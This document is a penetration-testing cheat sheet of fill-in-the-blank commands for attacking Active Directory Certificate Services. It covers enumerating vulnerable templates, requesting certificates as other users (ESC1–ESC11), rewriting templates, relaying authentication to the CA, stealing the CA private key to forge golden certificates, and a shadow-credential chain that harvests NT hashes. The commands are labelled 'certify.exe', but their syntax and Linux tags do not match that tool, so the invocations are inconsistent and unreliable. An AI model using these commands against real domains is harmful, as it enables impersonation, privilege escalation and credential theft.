# certify

% adcs, certificate, pki, windows, Active directory, template, shadow credential
#plateform/windows #target/remote #cat/AD/RECON


## enum - Ca
```powershell
Certify.exe cas
```
## enum - list enabled certificate templates 
```
certify.exe find -enabled  -hide-admins -u <user>@<domain_fqdn> -p '<password>' -dc-ip <dc_ip> [-stdout]
```

## enum - list enabled certificate templates (socks)
add CA to /etc/hosts
```
certify.exe find -enabled -hide-admins -u <user>@<domain_fqdn> -p '<password>' -dc-ip <dc_ip> -ns <dc_ip> -dns-tcp [-stdout]
```

## enum - list vulnerable certificate templates 
```
certify.exe find -vulnerable -hide-admins -u <user>@<domain_fqdn> -p '<password>' -dc-ip <dc_ip> -ns <dc_ip> -dns-tcp [-stdout]
```

## enum - list vulnerable certificate templates (socks)
add CA to /etc/hosts
```
certify.exe find -vulnerable -hide-admins -u <user>@<domain_fqdn> -p '<password>' -dc-ip <dc_ip> -ns <dc_ip> -dns-tcp [-stdout]
```

## enum - enumerate to bloodhound (socks)
```bash
certify.exe find -enabled  -u <user>@<domain_fqdn> -p '<password>' -dc-ip <dc_ip> -ns <dc_ip> -dns-tcp  -old-bloodhound
```

## req - request certificate (v1)
```
certify.exe req -u <user>@<domain_fqdn> -p '<password>' -dc-ip <dc_ip> -ns <dc_ip> -dns-tcp  -ca <ca_name> -template <template> 
```

## req - request certificate (v2)
```
certify.exe req -u <user>@<domain_fqdn> -p '<password>' -target-ip <ca_ip>  -ca <ca_name> -template <template> 
```


## req - retrieve approved request 
```
certify.exe req -u <user>@<domain_fqdn> -p '<password>' -target-ip <ca_ip>  -ca <ca_name> -retrieve <id>
```

## cert - extract cert from pfx
#plateform/linux #target/remote #cat/UTILS
```
certify.exe cert -pfx <pfx> -nokey -out <file>.crt -password <password|jubeaz>
```

## cert - extract key from pfx
```
certify.exe cert -pfx <pfx> -nocert -out <file>.key -password <password|jubeaz>
```

## cert - create pfx from cert
#plateform/linux #target/remote #cat/UTILS
```
certify.exe cert -key <key_file>  -cert <cert_file>  -export -out <pfx_file>
```

## auth - authenticate with pfx certificate
#plateform/linux #target/remote #cat/CONNECT
KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type ======> keep trying 
```
certify.exe auth -pfx <pfx-file>  -domain <domain_fqdn> -username <user> -dc-ip <dc_ip> -ns <dc_ip> -dns-tcp 
```

## auth - authenticate through LDAP (Schannel) with pfx certificate
#plateform/linux #target/remote #cat/CONNECT
```
certify.exe auth -pfx <pfx-file> -dc-ip <dc_ip> -ldap-shell
```

## Golden Certificate - steal CA certificate and private key
#plateform/linux #target/remote #cat/ATTACK
```
certify.exe ca -u <user>@<domain_fqdn> -p '<password>' -backup -dc-ip <dc_ip> -ns <dc_ip> -dns-tcp  -ca <ca_name>
```

## Golden Certificate - forge certificate
#plateform/linux #target/remote #cat/ATTACK
```
certify.exe forge -ca-pfx <pfx-file> -upn <user>@<domain_fqdn> -crl ldap://<dc_ip>:389
```

## req - request certificate for another user - ESC1 - ESC6
#plateform/linux #target/remote #cat/ATTACK
```
certify.exe req -u <user>@<domain_fqdn> -p '<password>' -dc-ip <dc_ip> -ns <dc_ip> -dns-tcp  -ca <ca_name> -template <template>  -upn <targeted-user>@<domain_fqdn>
```

## req - request certificate on behalf of with Certificate Request Agent certificate - ESC3
#plateform/linux #target/remote #cat/ATTACK
```
certify.exe req -u <user>@<domain_fqdn> -p '<password>' -dc-ip <dc_ip> -ns <dc_ip> -dns-tcp  -ca <ca_name> -template <template> -on-behalf-of '<NetBIOS-domain-name>\<targeted-user>' -pfx <pfx-file>
```

## template - modify template in order to make it vulnerable to ESC1 - ESC4
#plateform/linux #target/remote #cat/ATTACK
```
certify.exe template -u <user>@<domain_fqdn> -p '<password>' -dc-ip <dc_ip> -ns <dc_ip> -dns-tcp  -template <template> -save-old
```

## ca - Issue certificate for specific request id - ESC7
#plateform/linux #target/remote #cat/ATTACK
```
certify.exe ca -u <user>@<domain_fqdn> -p '<password>' -dc-ip <dc_ip> -ns <dc_ip> -dns-tcp  -ca <ca_name> -issue-request <csr-id>
```

## relay - relay authentication to CA Web Enrollment - ESC8
#plateform/linux #target/remote #cat/ATTACK
```
certify.exe relay -target <ca_ip>  -template <template>
```

## relay - relay authentication to RPC Enrollment - ESC11
#plateform/linux #target/remote #cat/ATTACK
```
certify.exe relay -target "rpc://<ca_name>.<domain_fqdn>" -dc-ip <dc_ip> -ns <dc_ip> -dns-tcp  -ca <ca_name> -template <template>
```

## account - Modify user upn to another one - ESC9 - ESC10
#plateform/linux #target/remote #cat/ATTACK
```
certify.exe account update -u <user>@<domain_fqdn> -p '<password>' -dc-ip <dc_ip> -ns <dc_ip> -dns-tcp  -user <targeted-user> -upn <target_upn>
```


## account - add computer
#plateform/linux #target/remote #cat/ATTACK
```
certify.exe account create -u <user>@<domain_fqdn> -p '<password>' -dc-ip <dc_ip> -ns <dc_ip> -dns-tcp  -user user <computer_name> -dns <fqdn>
```


## shadow - get NT Hash using Shadow Credential
#plateform/linux #target/remote #cat/ATTACK
Full Chain exploit of Shadow Credential: Create a Key Credential, Authenticate to get NT hash and TGT, and remove the Key Credential
```
certify.exe shadow auto -u <user>@<domain_fqdn> -p '<password>' -account <targeted-user>  -dc-ip <dc_ip> -ns <dc_ip> -dns-tcp 
```